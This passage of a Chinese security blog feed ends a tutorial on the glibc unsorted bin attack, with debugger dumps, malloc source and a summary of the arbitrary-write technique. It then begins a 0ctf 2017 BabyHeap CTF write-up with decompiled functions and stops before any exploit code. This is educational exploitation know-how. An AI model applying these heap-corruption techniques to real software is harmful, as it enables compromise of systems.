class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>pwndbg&gt; unsortedbin <br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x00007fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x00000000004007a8</span><span class="hljs-number">0x0000000000400870</span><br>    <span class="hljs-meta">#unsortedbin中bk指针所指向的地方</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602010</span><br>    #想要被修改为超大值的地方<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h3 id="执行malloc-0x410"><a href="#执行malloc-0x410" class="headerlink" title="执行malloc-0x410"></a>执行malloc(0x410)</h3><p>执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的<strong>最后一个</strong>chunk拿出来。<br>由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。</p><blockquote><p>unsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即<strong>插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。</strong></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>之后结果如下：<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007fffffffdd68</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x000000000040080a</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x0000000000602010</span><br>    #现在此地址被更改为较大的数（其值为main_arena+<span class="hljs-number">88</span>的地址）<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><p>申请过程如下图所示：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><img src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png" alt="Snipaste_2023-09-13_20-51-30.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><img src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png" alt="Snipaste_2023-09-13_20-52-24.png"></p><p>核心代码如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#源码第<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>行<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbin的bk改为chunk的bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//将chunk的bk所指向的fd改为unsortedbin的地址</span><br><span class="hljs-comment">//unsorted_chunks(av)其实是&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>解释：<br>unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); <br>bck-&gt;fd (chunk的fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure><p>运行结果如下:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span><span class="hljs-comment">//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>再来看一下unsortedbin的源码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     {<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #显然，bck被修改，并不符合这里的要求<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         {<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size - nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             {<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             }<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         }<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure><p>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，**victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。**然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7fff7b5eecf8</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x24d0010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 <span class="hljs-number">0x7f691338eb78</span><br>现在假设有个漏洞，可以让我们修改 <span class="hljs-built_in">free</span> 了的 chunk 的 bk 指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 bk 指针:<span class="hljs-number">0x7fff7b5eece8</span><br><br>再去 <span class="hljs-built_in">malloc</span> 的时候可以发现那里的值已经改变为 unsorted bin 的地址<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure><p>这里我们可以看到 <strong>unsorted bin attack 确实可以修改任意地址的值</strong>，<strong>但是所修改成的值却不受我们控制</strong>，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说<br>● <strong>我们通过修改循环的次数来使得程序可以执行多次循环。</strong><br><strong>●</strong> <strong>我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉全篇看最后一句话就够了(哈哈哈)</p><p>总结一下unsortedbin attack这种攻击方式：<br>首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88地址的值</p><blockquote><p>target_addr：目标地址（想要修改为超大数的地址）</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;strong&gt;关于unsorted bin 和 unsorted bin attack&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;
&lt;p&gt;unsort</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>0ctf_2017_BabyHeap</title>
    <link href="https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/"/>
    <id>https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/</id>
    <published>2023-09-13T07:26:29.000Z</published>
    <updated>2023-09-13T09:29:56.357Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>fastbin_attack中的Arbitrary Alloc（例题）</strong></h1><p>具体例子原理网上很多，这里就不再赘述了，这里讲解一道<strong>fastbin_attack中的Arbitrary Alloc</strong></p><blockquote><p>题目来源：0ctf 2017 BabyHeap<br>参考资料：<br><a href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #思路<br>CTF-wiki<br><a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br><a href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #关闭地址随机化</p></blockquote><blockquote><p>附件：<br>链接: <a href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a>  密码: f1i6<br>–来自百度网盘超级会员V3的分享</p></blockquote><hr><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>将文件下载下来，首先检查一下文件的保护情况：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png'><img src="https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png" alt="Snipaste_2023-09-13_15-31-15.png"></p><p>可以看到保护全部开启（这还玩个毛线啊）<br>具体看一下各个保护：</p><blockquote><p>Arch:   amd64-64-little<br>这个说明程序是64位程序，小端序<br>RELRO:   Full RELRO<br>Full RELRO开启，使整个 GOT 只读，从而无法被覆盖，进一步来说GOT表无法被修改<br>Stack:   Canary found<br>对使用随机数每个函数进行保护，防止栈溢出<br>NX:    NX enabled<br>不能向栈上直接注入shellcode<br>PIE:    PIE enabled<br>地址随机化，我感觉这个保护是最恶心的<br>来看一下我的Linux环境：<br>Ubuntu版本：16.04</p></blockquote><p>其中libc-2.23.so是我本机的libc文件</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>整个程序相当于一个堆内存管理器，静态分析一下吧：</p><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main-函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>{<br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  addr = get_addr();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();                                     <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">//   puts("1. Allocate");</span><br>                                                <span class="hljs-comment">//   puts("2. Fill");</span><br>                                                <span class="hljs-comment">//   puts("3. Free");</span><br>                                                <span class="hljs-comment">//   puts("4. Dump");</span><br>                                                <span class="hljs-comment">//   puts("5. Exit");</span><br>                                                <span class="hljs-comment">//   printf("Command: ");</span><br>                                                <span class="hljs-comment">// </span><br>    input();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> __int64)off_14F4 )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1uLL</span>:<br>        Allocate((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2uLL</span>:<br>        Fill((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3uLL</span>:<br>        Free((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4uLL</span>:<br>        Dump((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5uLL</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>主函数内容，包含菜单函数和四个堆功能函数</p><h3 id="get-addr-函数-生成随机地址"><a href="#get-addr-函数-生成随机地址" class="headerlink" title="get-addr-函数-生成随机地址"></a>get_addr 函数(生成随机地址)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">get_addr</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  buf[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  alarm(<span class="hljs-number">60u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"===== Baby Heap in 2017 ====="</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);                 <span class="hljs-comment">// 调用系统文件生成随机数</span><br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> || read(fd, buf, <span class="hljs-number">0x10</span>uLL) != <span class="hljs-number">16</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  close(fd);<br>  addr = (<span class="hljs-type">char</span> *)((buf[<span class="hljs-number">0</span>] % <span class="hljs-number">0x555555543000</span>uLL + <span class="hljs-number">0x10000</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000</span>LL);<br>  v3 = (buf[<span class="hljs-number">1</span>] % <span class="hljs-number">0xE80</span>uLL) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL;<br>  <span class="hljs-keyword">if</span> ( mmap(addr, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>) != addr )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">return</span> &amp;addr[v3];                             <span class="hljs-comment">// 利用生成的随机数来生成随机地址</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>​这个函数可以使程序堆块信息存放在随机地址中，而不是固定的地址，因此我们很难通过找到存放堆块信息的地址来修改其地址从而控制程序的流程。<br>​还需要提一句的是，这个函数有alarm函数，从程序运行60秒之后就会终止进程，如果不想在调试程序的时候被打断，可以对二进制文件进行patch。patch之后的可执行文件名为：babyheap_0ctf_2017_patch</p><p>返回的addr 指针 包含了 所有chunk 的 信息和 数据chunk 的指针</p><h3 id="meau-函数"><a href="#meau-函数" class="headerlink" title="meau-函数"></a>meau 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"1. Allocate"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"2. Fill"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"3. Free"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"4. Dump"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"5. Exit"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Command: "</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>打印菜单</p><h3 id="Alloc-函数"><a href="#Alloc-函数" class="headerlink" title="Alloc-函数"></a>Alloc 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Allocate</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *calloc_ptr; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !*(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>      size = input();<br>      <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">4096</span> )<br>          size = <span class="hljs-number">4096</span>;<br>        calloc_ptr = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>        <span class="hljs-keyword">if</span> ( !calloc_ptr )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        *(_DWORD *)(<span class="hljs-number">24LL</span> * i + a1) = <span class="hljs-number">1</span>;<span class="hljs-comment">//chunk_flag</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">8</span>) = size;<span class="hljs-comment">//chunk_size</span><br>        *(_QWORD *)(a1 + <span class="hljs-number">24LL</span> * i + <span class="hljs-number">16</span>) = calloc_ptr;<span class="hljs-comment">//chunk_data_ptr 